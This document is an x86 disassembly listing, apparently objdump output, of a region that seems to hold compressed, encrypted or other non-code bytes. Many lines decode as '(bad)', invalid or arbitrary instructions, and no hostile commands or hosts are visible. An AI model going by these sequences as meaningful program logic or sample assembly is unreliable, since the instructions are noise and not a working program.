  429f2c:	aad    0x42
  429f2e:	mov    cl,0x10
  429f30:	adc    ebx,esi
  429f32:	test   DWORD PTR [ebp+eiz*4+0x12],edx
  429f36:	into   
  429f37:	(bad)  
  429f39:	push   es
  429f3a:	loop   0x429eee
  429f3c:	push   edi
  429f3d:	dec    ecx
  429f3e:	dec    edx
  429f3f:	xchg   DWORD PTR [ebx],esp
	...
  429fb1:	add    BYTE PTR [eax],al
  429fb3:	add    cl,ah
  429fb5:	in     al,dx
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x3e946d7b]
  429fc2:	mov    dh,0xf
  429fc4:	loope  0x429f82
  429fc6:	add    DWORD PTR [eax],eax
  429fc8:	cmc    
  429fc9:	add    BYTE PTR [eax],al
  429fcb:	add    BYTE PTR [esi+0x29],ah
  429fce:	mov    edi,0x44b69ef9
  429fd3:	and    edx,eax
  429fd5:	push   edx
  429fd6:	xchg   ebp,eax
  429fd7:	adc    dl,BYTE PTR [edi]
  429fd9:	call   0x42a1:0xb9c26981
  429fe0:	sbb    BYTE PTR [esi+0x8],cl
  429fe3:	sub    eax,0xce21aa5f
  429fe8:	test   al,0x39
  429fea:	ins    DWORD PTR es:[edi],dx
  429feb:	add    ecx,DWORD PTR [edx-0x2a]
  429fee:	jg     0x42a046
  429ff0:	mov    edi,0xc78191d9
  429ff5:	ins    BYTE PTR es:[edi],dx
  429ff6:	add    DWORD PTR [ebp-0x36bff298],0x8d5f710a
  42a000:	sar    edi,0xf2
  42a003:	or     esp,eax
  42a005:	xor    DWORD PTR [esi],ebx
  42a007:	mov    bl,0xfa
  42a009:	push   edx
  42a00a:	dec    esp
  42a00b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a00c:	retf   0x8904
  42a00f:	xchg   edi,eax
  42a010:	enter  0xd1f3,0x53
  42a014:	jl     0x42a075
  42a016:	std    
  42a017:	icebp  
  42a018:	fsub   DWORD PTR [edi-0x67e5953d]
  42a01e:	retf   
  42a01f:	sub    eax,0x56f26837
  42a024:	dec    esi
  42a025:	pop    eax
  42a026:	dec    ebp
  42a027:	inc    esi
  42a028:	dec    ebx
  42a029:	pop    edx
  42a02a:	arpl   sp,bx
  42a02c:	cs mov ebx,0x898b391b
  42a032:	adc    ah,BYTE PTR [ecx-0x2c582470]
  42a038:	adc    edi,DWORD PTR [ebx+ecx*2+0x18]
  42a03c:	fild   DWORD PTR [ebx+0x3c]
  42a03f:	mov    cl,0x87
  42a041:	lds    edx,FWORD PTR [edi+0x37b473e3]
  42a047:	jae    0x429fff
  42a049:	mov    ds,WORD PTR [eax*2-0x3feea314]
  42a050:	cmp    BYTE PTR [esi],0xe2
  42a053:	addr16 and ebx,ecx
  42a056:	cmp    DWORD PTR fs:[eax+0xc],edi
  42a05a:	call   0xc3f2:0x7a8e7171
  42a061:	push   edi
  42a062:	dec    edi
  42a063:	xchg   ecx,eax
  42a064:	daa    
  42a065:	inc    ebp
  42a066:	jmp    0x6d5d2e45
  42a06b:	je     0x42a045
  42a06d:	test   BYTE PTR [edx-0x35bbb470],ch
  42a073:	dec    edi
  42a074:	pop    es
  42a075:	js     0x42a047
  42a077:	dec    esi
  42a078:	push   eax
  42a079:	jg     0x42a098
  42a07b:	push   eax
  42a07c:	test   al,0x30
  42a07e:	adc    DWORD PTR [edi-0x60],ebp
  42a081:	push   edi
  42a082:	(bad)  
  42a083:	mov    dl,0x8b
  42a085:	mov    eax,0xe00a0050
  42a08a:	shr    dh,1
  42a08c:	ror    DWORD PTR [eax+0x9aca271],1
  42a092:	pushf  
  42a093:	inc    ebp
  42a094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a096:	aam    0x6b
  42a098:	add    al,0x53
  42a09a:	ja     0x42a0b3
  42a09c:	inc    esi
  42a09d:	dec    esi
  42a09e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a09f:	dec    esp
  42a0a0:	inc    eax
  42a0a1:	and    al,BYTE PTR [esi-0x6d]
  42a0a4:	mov    al,ds:0x7e520c84
  42a0a9:	(bad)  [ecx+0x7e]
  42a0ac:	outs   dx,DWORD PTR ds:[esi]
  42a0ad:	mov    dl,0x8f
  42a0af:	cs aas 
  42a0b1:	cmc    
  42a0b2:	stos   DWORD PTR es:[edi],eax
  42a0b3:	pusha  
  42a0b4:	jp     0x42a0df
  42a0b6:	sub    dh,cl
  42a0b8:	pop    esp
  42a0b9:	pop    edx
  42a0ba:	imul   edx,DWORD PTR [edx],0xeb218ad9
  42a0c0:	mov    edi,0x0
	...
  42a131:	add    BYTE PTR [eax],al
  42a133:	add    BYTE PTR [esi-0x79],dl
  42a136:	std    
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	int    0xc1
  42a142:	jno    0x42a103
  42a144:	(bad)  
  42a145:	mov    ebp,0xf50001
  42a14a:	add    BYTE PTR [eax],al
  42a14c:	xchg   esi,eax
  42a14d:	jge    0x42a171
  42a14f:	sbb    eax,0x6d2e4fab
  42a154:	mov    ds:0xb491ba88,al
  42a159:	lock clc 
  42a15b:	inc    esi
  42a15c:	xor    bl,dh
  42a15e:	jb     0x42a1ca
  42a160:	fwait
  42a161:	jbe    0x42a1d8
  42a163:	xor    BYTE PTR [edx-0x6c],dh
  42a166:	imul   ebx,esi,0x7a
  42a169:	push   eax
  42a16a:	adc    ecx,edi
  42a16c:	rcr    BYTE PTR [eax],cl
  42a16e:	repz retf 0xe5e5
  42a172:	inc    eax
  42a173:	popa   
  42a174:	pop    ecx
  42a175:	shl    DWORD PTR [ebp-0x4b0f1b95],1
  42a17b:	fdivr  st(2),st
  42a17d:	(bad)  
  42a17e:	cwde   
  42a17f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a180:	xchg   esi,eax
  42a181:	aad    0xeb
  42a183:	clc    
  42a184:	sub    DWORD PTR [esi],0xffffffe8
  42a187:	retf   0xfebd
  42a18a:	adc    DWORD PTR [eax],ebp
  42a18c:	clc    
  42a18d:	dec    eax
  42a18e:	mov    edi,0xed04d3ba
  42a193:	dec    edx
  42a194:	pop    ebp
  42a195:	sbb    DWORD PTR [eax],edx
  42a197:	cmp    ebp,DWORD PTR [ebp-0x62]
  42a19a:	push   edi
  42a19b:	adc    ch,ch
  42a19d:	xchg   ecx,eax
  42a19e:	mov    ds:0x5b17478f,eax
  42a1a3:	sub    al,0x5b
  42a1a5:	inc    edx
  42a1a6:	dec    esi
  42a1a7:	pop    ss
  42a1a8:	inc    ecx
  42a1a9:	xor    BYTE PTR [ecx-0x19],al
  42a1ac:	out    dx,al
  42a1ad:	mul    DWORD PTR [edi+0x7f]
  42a1b0:	push   edx
  42a1b1:	pop    es
  42a1b2:	mov    ah,0x80
  42a1b4:	dec    edx
  42a1b5:	xchg   ebp,eax
  42a1b6:	shl    DWORD PTR [ebx],1
  42a1b8:	xchg   esi,eax
  42a1b9:	sbb    eax,DWORD PTR [eax]
  42a1bb:	pop    edi
  42a1bc:	push   0x41fb4c9f
  42a1c1:	icebp  
  42a1c2:	dec    eax
  42a1c3:	div    DWORD PTR [edx]
  42a1c5:	fwait
  42a1c6:	pop    es
  42a1c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a1c8:	test   al,0x16
  42a1ca:	int3   
  42a1cb:	ins    DWORD PTR es:[edi],dx
  42a1cc:	push   esi
  42a1cd:	fistp  WORD PTR [edx]
  42a1d0:	mov    dh,0x5b
  42a1d2:	mov    al,0x88
  42a1d4:	sbb    DWORD PTR [eax-0x20],ecx
  42a1d7:	mov    ecx,0xbd9e04f9
  42a1dc:	adc    ecx,eax
  42a1de:	inc    esi
  42a1df:	dec    ebp
  42a1e0:	retf   0xab87
  42a1e3:	pop    esp
  42a1e4:	ss (bad) 
  42a1e6:	jmp    0x8b40:0xcae93b53
  42a1ed:	out    dx,eax
  42a1ee:	jnp    0x42a24b
  42a1f0:	mov    ebx,0x5364af83
  42a1f5:	sbb    BYTE PTR [ebx+0x4e],0xc1
  42a1f9:	ins    DWORD PTR es:[edi],dx
  42a1fa:	xchg   ebx,eax
  42a1fb:	scas   al,BYTE PTR es:[edi]
  42a1fc:	mov    esp,0x5e8688c7
  42a201:	mov    ch,0x37
  42a203:	fld    QWORD PTR [eax-0x7d4b524f]
  42a209:	mov    eax,esi
  42a20b:	icebp  
  42a20c:	xchg   edi,eax
  42a20d:	mov    edx,0xa8689b9a
  42a212:	xor    eax,0xaad50ae4
  42a217:	jecxz  0x42a1b9
  42a219:	xor    DWORD PTR [edx+0x5419f122],0x1ca6f976
  42a223:	adc    dh,BYTE PTR es:[edx+0xe8a8219]
  42a22a:	xchg   ecx,eax
  42a22b:	call   0x98c7134a
  42a230:	inc    esi
  42a231:	fnstenv [ebx]
  42a233:	stos   DWORD PTR es:[edi],eax
  42a234:	sbb    dh,BYTE PTR [esi+ebx*1+0xa]
  42a238:	or     eax,0x4e5e2eff
  42a23d:	adc    cl,BYTE PTR [edi+0x3d]
  42a240:	leave  
	...
  42a2b1:	add    BYTE PTR [eax],al
  42a2b3:	add    al,dh
  42a2b5:	adc    al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0x9a7f8ab9
  42a2c1:	(bad)  
  42a2c2:	arpl   WORD PTR [edi],ax
  42a2c4:	retf   
  42a2c5:	mov    esi,0xf50001
  42a2ca:	add    BYTE PTR [eax],al
  42a2cc:	mov    dl,bl
  42a2ce:	retf   
  42a2cf:	and    eax,0xc231c9bd
  42a2d4:	dec    eax
  42a2d5:	xor    eax,0xe4ff532
  42a2da:	(bad)  
  42a2db:	push   cs
  42a2dc:	(bad)  
  42a2dd:	test   eax,0x9f87140b
  42a2e2:	adc    DWORD PTR [ecx-0x17237eb3],ebx
  42a2e8:	inc    esp
  42a2e9:	xchg   edx,eax
  42a2ea:	sub    al,BYTE PTR [eax+0x12]
  42a2ed:	ds es inc esp
  42a2f0:	push   ebx
  42a2f1:	xchg   BYTE PTR [eax+ebx*8+0x452708fc],bh
  42a2f8:	mov    edx,0x5185a705
  42a2fd:	retf   
  42a2fe:	cwde   
  42a2ff:	pop    ebp
  42a300:	in     eax,0x66
  42a302:	(bad)  [edx]
  42a304:	outs   dx,DWORD PTR ds:[esi]
  42a305:	jecxz  0x42a2b6
  42a307:	jae    0x42a2e9
  42a309:	es mov bh,0xb8
  42a30c:	sbb    BYTE PTR [edi+0x5d],0x14
  42a310:	scas   al,BYTE PTR es:[edi]
  42a311:	and    esp,edi
  42a313:	mov    ecx,0xce3925b7
  42a318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a319:	fbld   TBYTE PTR [eax+0x5]
  42a31c:	push   ds
  42a31d:	dec    ch
  42a31f:	xlat   BYTE PTR ds:[ebx]
  42a320:	dec    ecx
  42a321:	jmp    0x42a382
  42a323:	or     ebx,0xf6d5ddff
  42a329:	sub    dh,BYTE PTR [edx]
  42a32b:	imul   esp,eax,0xf0311ad4
  42a331:	pop    ebx
  42a332:	jno    0x42a307
  42a334:	stos   DWORD PTR es:[edi],eax
  42a335:	sbb    edi,ebp
  42a337:	mov    edx,0x14175218
  42a33c:	sbb    al,0x17
  42a33e:	fwait
  42a33f:	scas   al,BYTE PTR es:[edi]
  42a340:	popf   
  42a341:	jle    0x42a361
  42a343:	jne    0x42a2e7
  42a345:	inc    esi
  42a346:	xor    al,0x3
  42a348:	repnz gs mov esp,0x8d52ad53
  42a34f:	or     al,0x57
  42a351:	and    esp,ebp
  42a353:	rcr    DWORD PTR [ebp+0x63],0x89
  42a357:	dec    esi
  42a358:	gs (bad) 
  42a35a:	jmp    0xe84dfe6b
  42a35f:	out    0x43,al
  42a361:	test   al,0x40
  42a363:	adc    bl,bh
  42a365:	sar    DWORD PTR [ecx+0x191190ba],0x8e
  42a36c:	mov    eax,0x84e9af92
  42a371:	pop    esi
  42a372:	and    eax,0x45
  42a375:	dec    esi
  42a376:	nop
  42a377:	adc    eax,0xc92527f0
  42a37c:	add    al,0x9f
  42a37e:	inc    esi
  42a37f:	jno    0x42a313
  42a381:	je     0x42a313
  42a383:	and    eax,0xfb3131a0
  42a388:	pusha  
  42a389:	scas   al,BYTE PTR es:[edi]
  42a38a:	mov    ecx,0x12cda4dc
  42a38f:	aad    0x9f
  42a391:	in     al,dx
  42a392:	adc    ebx,DWORD PTR [eax+0x20b8fd94]
  42a398:	call   0x91e6c06f
  42a39d:	sahf   
  42a39e:	jns    0x42a34b
  42a3a0:	dec    ecx
  42a3a1:	xchg   ecx,eax
  42a3a2:	out    dx,al
  42a3a3:	cmp    edx,esi
  42a3a5:	lahf   
  42a3a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a3a7:	mov    DWORD PTR [eax+0x76],edi
  42a3aa:	sbb    DWORD PTR [edi+edx*1-0x79],0x12a6791c
  42a3b2:	jg     0x42a421
  42a3b4:	pushf  
  42a3b5:	or     cl,BYTE PTR [ecx]
  42a3b7:	test   ebx,esi
  42a3b9:	cmp    al,0xb5
  42a3bb:	or     eax,DWORD PTR [edi+0x2c]
  42a3be:	push   cs
  42a3bf:	out    0x60,al
	...
  42a431:	add    BYTE PTR [eax],al
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a4a0
  42a441:	vhaddpd xmm0,xmm5,xmm0
  42a445:	mov    edi,0xf50001
  42a44a:	add    BYTE PTR [eax],al
  42a44c:	repnz mov edx,0xb6a3fa35
  42a452:	inc    eax
  42a453:	bound  ebp,QWORD PTR [edi]
  42a455:	in     al,dx
  42a456:	jnp    0x42a4aa
  42a458:	xchg   esp,eax
  42a459:	mov    cl,dl
  42a45b:	stc    
  42a45c:	adc    bh,al
  42a45e:	push   ss
  42a45f:	inc    esi
  42a460:	mov    cl,BYTE PTR gs:[ecx-0x2d]
  42a464:	mov    WORD PTR [ecx+0x6f30928a],?
  42a46a:	jmp    0xf4790d
  42a46f:	cli    
  42a470:	(bad)  
  42a472:	dec    ecx
  42a473:	(bad)  
  42a474:	sbb    BYTE PTR [eax+0x7c],al
  42a477:	mov    cl,0x27
  42a479:	lods   eax,DWORD PTR ds:[esi]
  42a47a:	jae    0x42a409
  42a47c:	pop    ds
  42a47d:	in     al,dx
  42a47e:	mov    ah,0xb3
  42a480:	and    BYTE PTR [esi+0xd],cl
  42a483:	aas    
  42a484:	ins    DWORD PTR es:[edi],dx
  42a485:	fs adc dh,bl
  42a488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a489:	and    edx,esi
  42a48b:	adc    cl,BYTE PTR [edi+0x3]
  42a48e:	add    DWORD PTR [ebp-0x4f3aeefb],ecx
  42a494:	shl    BYTE PTR [ebx-0x8],1
  42a497:	out    dx,eax
  42a498:	fs push ecx
  42a49a:	xchg   edx,eax
  42a49b:	push   eax
  42a49c:	adc    BYTE PTR [edi+0x39],dh
  42a49f:	psubd  mm6,mm6
  42a4a2:	jge    0x42a50b
  42a4a4:	js     0x42a4f2
  42a4a6:	jo     0x42a518
  42a4a8:	cwde   
  42a4a9:	les    esi,FWORD PTR [ebx-0x79299e5b]
  42a4af:	es mov bl,0xfb
  42a4b2:	pop    ecx
  42a4b3:	ret    0x4636
  42a4b6:	es push 0x364ad2a9
  42a4bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4bd:	gs mov cl,bl
  42a4c0:	push   ebp
  42a4c1:	jle    0x42a4cf
  42a4c3:	dec    ebx
  42a4c4:	dec    esi
  42a4c5:	js     0x42a4f8
  42a4c7:	sti    
  42a4c8:	push   esp
  42a4c9:	das    
  42a4ca:	stos   BYTE PTR es:[edi],al
  42a4cb:	mov    dl,0xec
  42a4cd:	daa    
  42a4ce:	jge    0xb63e6ba4
  42a4d4:	adc    BYTE PTR [eiz*4-0x14bca553],dl
  42a4db:	mov    ds:0x31657aef,al
  42a4e0:	mov    esp,0xe2af3c57
  42a4e5:	in     eax,dx
  42a4e6:	cwde   
  42a4e7:	mov    bl,BYTE PTR [edx+0x74e3910b]
  42a4ed:	push   0x289135d3
  42a4f2:	sub    DWORD PTR [eax-0x6a],0x1e
  42a4f6:	xor    cl,ch
  42a4f8:	or     DWORD PTR [ebx-0x67a5fd5f],esp
  42a4fe:	je     0x42a546
  42a500:	push   edi
  42a501:	ds mov dl,al
  42a504:	xor    BYTE PTR [edi+ebx*2-0x70a35d36],0x31
  42a50c:	mov    eax,0xdadaf2fc
  42a511:	jb     0x42a4ee
  42a513:	dec    ebp
  42a514:	push   0x918a59d7
  42a519:	xchg   edi,eax
  42a51a:	outs   dx,DWORD PTR ds:[esi]
  42a51b:	call   0xad9f:0xae363b9a
  42a522:	mov    esi,0x6b8687c1
  42a527:	fwait
  42a528:	inc    esi
  42a529:	xchg   dl,bh
  42a52b:	and    ebx,esp
  42a52d:	loope  0x42a4cc
  42a52f:	aad    0x57
  42a531:	push   edi
  42a532:	adc    bh,ch
  42a534:	out    dx,al
  42a535:	test   al,0x60
  42a537:	test   al,0xde
  42a539:	sub    eax,0xebbc26b1
  42a53e:	(bad)  
  42a53f:	pop    edi
  42a540:	test   BYTE PTR [eax],0x0
	...
  42a5b3:	add    BYTE PTR [ebp+0x1d],ch
  42a5b6:	out    0xc0,al
  42a5b8:	idiv   bl
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	mov    edi,0xb5e28168
  42a5c5:	rol    BYTE PTR [ecx],0x0
  42a5c8:	cmc    
  42a5c9:	add    BYTE PTR [eax],al
  42a5cb:	add    BYTE PTR [ebx+0x64f4736c],bh
  42a5d1:	mov    ebp,0xe4074422
  42a5d6:	fs dec edx
  42a5d8:	in     al,dx
  42a5d9:	fild   WORD PTR [ecx]
  42a5db:	cmp    eax,0xa5e9bae9
  42a5e0:	sgdtd  [esi+0x26b89d42]
  42a5e7:	jmp    0xecc5:0x7a7e9c15
  42a5ee:	scas   eax,DWORD PTR es:[edi]
  42a5ef:	dec    edi
  42a5f0:	in     al,dx
  42a5f1:	jl     0x42a672
  42a5f3:	aad    0x90
  42a5f5:	xor    esi,esi
  42a5f7:	icebp  
  42a5f8:	and    DWORD PTR [edx+0x53],ecx
  42a5fb:	pop    ebx
  42a5fc:	add    eax,0xbbeaf583
  42a601:	inc    edx
  42a602:	mov    eax,0xb1bb0b9
  42a607:	adc    al,0x90
  42a609:	push   ds
  42a60a:	ins    DWORD PTR es:[edi],dx
  42a60b:	adc    DWORD PTR [esi],ecx
  42a60d:	sbb    DWORD PTR [ebx],esp
  42a60f:	pop    ebx
  42a610:	and    BYTE PTR [ebx+0x1e],ch
  42a613:	and    al,0xf6
  42a615:	jae    0x42a5b3
  42a617:	mov    DWORD PTR [ebx+0x31598129],ebp
  42a61d:	pop    esp
  42a61e:	stos   BYTE PTR es:[edi],al
  42a61f:	sub    BYTE PTR ds:0xb1ac3b9c,ch
  42a625:	pop    ss
  42a626:	xchg   edx,eax
  42a627:	test   DWORD PTR [ecx+0xa],0x3e73cb60
  42a62e:	es sub eax,0xac644389
  42a634:	adc    dl,BYTE PTR [ebx-0x47ddfb5c]
  42a63a:	je     0x42a6ad
  42a63c:	rcr    DWORD PTR [ebx+0x3f21dc4c],cl
  42a642:	clc    
  42a643:	and    ebp,DWORD PTR [ecx-0x48]
  42a646:	sub    esi,DWORD PTR [ebx]
  42a648:	inc    ebp
  42a649:	ds ins BYTE PTR es:[edi],dx
  42a64b:	dec    esp
  42a64c:	pusha  
  42a64d:	dec    ebp
  42a64e:	mov    edx,0xf39925cf
  42a653:	xor    DWORD PTR [ebx-0x7fd05579],ebx
  42a659:	sub    eax,0xe97553d7
  42a65e:	fadd   DWORD PTR [ebx+ebp*1]
  42a661:	stos   BYTE PTR es:[edi],al
  42a662:	retf   
  42a663:	mov    dh,ch
  42a665:	loopne 0x42a6e6
  42a667:	and    al,0xec
  42a669:	sbb    DWORD PTR [esi-0x40a0e479],0x1dc34451
  42a673:	les    ebp,FWORD PTR [edx]
  42a675:	lds    ebp,FWORD PTR [esi]
  42a677:	ds xchg ebx,eax
  42a679:	loope  0x42a61b
  42a67b:	jmp    0x4f512aa4
  42a680:	or     DWORD PTR [ebp+0x57],0x9d5ff106
  42a687:	add    ebx,esp
  42a689:	stc    
  42a68a:	leave  
  42a68b:	jg     0x42a630
  42a68d:	xchg   esp,eax
  42a68e:	mov    esp,0x21088071
  42a693:	xchg   ebx,eax
  42a694:	adc    al,0xa1
  42a696:	pop    eax
  42a697:	inc    edx
  42a698:	ds sub eax,0xf7d89c76
  42a69e:	call   0x611:0x407cd14d
  42a6a5:	jmp    0x42a70e
  42a6a7:	scas   al,BYTE PTR es:[edi]
  42a6a8:	cmp    edx,edi
  42a6aa:	popf   
  42a6ab:	add    ebp,DWORD PTR [eax]
  42a6ad:	loopne 0x42a6f4
  42a6af:	fwait
  42a6b0:	or     BYTE PTR [edx-0x18],0xe
  42a6b4:	addr16 push ecx
  42a6b6:	mov    edx,cr5
  42a6b9:	mov    eax,ds:0x41ba9d60
  42a6be:	sub    esp,DWORD PTR [ecx]
  42a6c0:	out    0x0,eax
	...
  42a732:	add    BYTE PTR [eax],al
  42a734:	xor    BYTE PTR [edx-0x21],al
  42a737:	(bad)  
  42a738:	(bad)  
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	stos   DWORD PTR es:[edi],eax
  42a741:	fldenv [ebx+0x5d]
  42a744:	stos   BYTE PTR es:[edi],al
  42a745:	rol    DWORD PTR [ecx],0x0
  42a748:	cmc    
  42a749:	add    BYTE PTR [eax],al
  42a74b:	add    BYTE PTR [ecx-0x42b26a56],dh
  42a751:	xor    eax,ebx
  42a753:	sub    ebp,DWORD PTR [ecx]
  42a755:	pop    eax
  42a756:	fcomp  DWORD PTR [ebp+edi*2+0x73f7bb65]
  42a75d:	jmp    0xd5cd:0xc9cc4332
  42a764:	adc    BYTE PTR [ebx+0x3],bl
  42a767:	pop    edx
  42a768:	cli    
  42a769:	xor    al,0x7b
  42a76b:	js     0x42a78a
  42a76d:	jbe    0x42a7cc
  42a76f:	(bad)  
  42a771:	repnz lods eax,DWORD PTR ds:[esi]
  42a773:	fcmovnb st,st(2)
  42a775:	mov    edx,0xdae78628
  42a77a:	dec    edi
  42a77b:	mov    ch,0x8a
  42a77d:	pop    ecx
  42a77e:	mov    DWORD PTR [ecx],esp
  42a780:	sbb    DWORD PTR [eax],esi
  42a782:	aam    0x7b
  42a784:	jg     0x42a78e
  42a786:	mov    ah,0xdb
  42a788:	or     DWORD PTR [eax],eax
  42a78a:	inc    esp
  42a78b:	ret    
  42a78c:	inc    esp
  42a78d:	sahf   
  42a78e:	or     dh,al
  42a790:	xor    al,0x55
  42a792:	loop   0x42a7af
  42a794:	and    BYTE PTR [ebp-0x7d2a4ffc],dh
  42a79a:	sub    ebp,eax
  42a79c:	cmp    ebp,DWORD PTR [ebp-0x70d7f611]
  42a7a2:	sub    dl,BYTE PTR [eax+0x3c4c6857]
  42a7a8:	push   edx
  42a7a9:	arpl   bp,bx
  42a7ab:	mov    bl,0x87
  42a7ad:	repnz sub al,0xc7
  42a7b0:	sbb    eax,0x9030669b
  42a7b5:	adc    ah,BYTE PTR [edx+0x1a]
  42a7b8:	inc    esp
  42a7b9:	inc    esp
  42a7ba:	(bad)  
  42a7bb:	and    BYTE PTR [ecx+0x7c],dl
  42a7be:	stc    
  42a7bf:	int3   
  42a7c0:	arpl   WORD PTR [edi],di
  42a7c2:	mov    esp,0x21ca4313
  42a7c7:	xor    ah,BYTE PTR [ebp-0x7e]
  42a7ca:	popa   
  42a7cb:	xor    edx,DWORD PTR [eax+0x3d]
  42a7ce:	nop
  42a7cf:	xacquire xchg BYTE PTR [edi],ah
  42a7d2:	jne    0x42a763
  42a7d4:	ret    
  42a7d5:	mov    ebp,0xe4a08cd2
  42a7da:	push   ebx
  42a7db:	adc    DWORD PTR [ebx+eax*1+0x40],ebp
  42a7df:	sbb    BYTE PTR [eax],0xe9
  42a7e2:	cwde   
  42a7e3:	icebp  
  42a7e4:	jl     0x42a7e0
  42a7e6:	fdiv   DWORD PTR [esi-0x43]
  42a7e9:	and    al,0x1e
  42a7eb:	mov    al,0xa8
  42a7ed:	ja     0x42a7c6
  42a7ef:	push   esp
  42a7f0:	(bad)  
  42a7f1:	dec    edi
  42a7f2:	lods   al,BYTE PTR ds:[esi]
  42a7f3:	retf   0xef4c
  42a7f6:	cmp    ebp,ebx
  42a7f8:	push   esp
  42a7f9:	inc    edi
  42a7fa:	inc    ecx
  42a7fb:	js     0x42a870
  42a7fd:	sub    al,0x86
  42a7ff:	cmp    ebp,DWORD PTR [ecx+0x31]
  42a802:	fwait
  42a803:	xchg   DWORD PTR ds:0xdbe94f58,ecx
  42a809:	les    ebx,FWORD PTR [eax+0x39]
  42a80c:	es loop 0x42a7c8
  42a80f:	jbe    0x42a848
  42a811:	mov    eax,ds:0xa2a81022
  42a816:	sub    DWORD PTR [ebx-0x72],esi
  42a819:	pop    ecx
  42a81a:	xor    bl,dl
  42a81c:	sub    al,0xd1
  42a81e:	and    BYTE PTR [eax-0x78],dh
  42a821:	push   edi
  42a822:	mov    al,ds:0x2a362e28
  42a827:	out    dx,eax
  42a828:	fwait
  42a829:	jmp    0xb7ac8683
  42a82e:	jo     0x42a885
  42a830:	ins    DWORD PTR es:[edi],dx
  42a831:	das    
  42a832:	jp     0x42a842
  42a834:	jne    0x42a820
  42a836:	add    ecx,DWORD PTR [ecx+ebx*4]
  42a839:	xor    eax,0x6142202d
  42a83e:	stc    
  42a83f:	ret    0x93
	...
  42a8b2:	add    BYTE PTR [eax],al
  42a8b4:	push   edi
  42a8b5:	push   0xdf7fdf64
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	adc    eax,esi
  42a8c2:	or     al,0x97
  42a8c4:	lahf   
  42a8c5:	ret    0x1
  42a8c8:	cmc    
  42a8c9:	add    BYTE PTR [eax],al
  42a8cb:	add    BYTE PTR [esi],dl
  42a8cd:	pop    ebp
  42a8ce:	inc    edi
  42a8cf:	loopne 0x42a86d
  42a8d1:	xchg   eax,esp
  42a8d3:	sbb    DWORD PTR [ebp-0x2a],edx
  42a8d6:	lock sub al,0xa5
  42a8d9:	cli    
  42a8da:	sub    edi,eax
  42a8dc:	mov    al,0x2b
  42a8de:	loop   0x42a8de
  42a8e0:	ficomp WORD PTR [esi+0x7f]
  42a8e3:	test   al,0xef
  42a8e5:	mov    ah,0x24
  42a8e7:	outs   dx,DWORD PTR ds:[esi]
  42a8e8:	out    dx,al
  42a8e9:	pushf  
  42a8ea:	js     0x42a8df
  42a8ec:	pop    edx
  42a8ed:	dec    esi
  42a8ee:	cmp    al,0xf6
  42a8f0:	shl    al,0x7c
  42a8f3:	mov    DWORD PTR [edi],esp
  42a8f5:	es jmp 0x4d55:0x9ee942c1
  42a8fd:	sub    BYTE PTR [edx-0x7f37635b],0x7e
  42a904:	cwde   
  42a905:	hlt    
  42a906:	mov    WORD PTR [eax],?
  42a908:	mov    eax,ds:0x10c615b1
  42a90d:	jns    0x42a94b
  42a90f:	sahf   
  42a910:	sub    al,0x3a
  42a912:	mov    ecx,DWORD PTR [edi]
  42a914:	xor    eax,0x23272e29
  42a919:	cmp    DWORD PTR [eax-0x30f8625c],esi
  42a91f:	mov    eax,ds:0x3b693c38
  42a924:	inc    ebx
  42a925:	fisub  WORD PTR [ecx-0x79]
  42a928:	xchg   esi,eax
  42a929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a92a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a92b:	(bad)  
  42a92c:	mov    ch,0x5b
  42a92e:	mov    ebp,0xe1433dad
  42a933:	dec    ecx
  42a934:	jle    0x42a905
  42a936:	daa    
  42a937:	repz adc esp,DWORD PTR [ebx-0x4f]
  42a93b:	cmp    BYTE PTR [esi+0x574fa40],dh
  42a941:	fst    QWORD PTR [ebx]
  42a943:	pop    eax
  42a944:	sbb    al,0x9b
  42a946:	scas   eax,DWORD PTR es:[edi]
  42a947:	call   0x4085:0x566af4c7
  42a94e:	cmp    al,0x17
  42a950:	dec    ebp
  42a951:	pop    es
  42a952:	cmp    dl,0x22
  42a955:	pop    ecx
  42a956:	mov    edx,0xa2e8f305
  42a95b:	or     DWORD PTR [ecx+0x16044d07],ebp
  42a961:	int3   
  42a962:	ret    
  42a963:	jno    0x42a988
  42a965:	adc    ebx,ecx
  42a967:	push   0x75
  42a969:	dec    esp
  42a96a:	xor    BYTE PTR [edi-0x6cab1ded],ch
  42a970:	pop    ecx
  42a971:	outs   dx,DWORD PTR ds:[esi]
  42a972:	sti    
  42a973:	retf   
  42a974:	ins    BYTE PTR es:[edi],dx
  42a975:	xor    eax,0xe37e0ea
  42a97a:	in     eax,dx
  42a97b:	(bad)  
  42a97c:	ret    
  42a97d:	popf   
  42a97e:	add    edi,DWORD PTR [ebx+eiz*4+0x56]
  42a982:	cmp    al,0x7c
  42a984:	into   
  42a985:	sub    DWORD PTR [edx],esi
  42a987:	pop    esi
  42a988:	add    al,0x7c
